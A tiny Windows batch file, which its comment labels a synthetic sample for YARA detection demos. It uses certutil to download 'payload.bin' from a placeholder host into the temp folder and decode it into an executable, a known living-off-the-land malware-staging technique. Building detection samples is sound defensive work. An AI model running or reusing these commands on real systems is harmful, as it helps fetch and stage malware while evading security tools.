@echo off
REM Synthetic living-off-the-land pattern for YARA demos
certutil -urlcache -split -f https://example.invalid/payload.bin %TEMP%\p.bin
certutil -decode %TEMP%\p.bin %TEMP%\p.exe
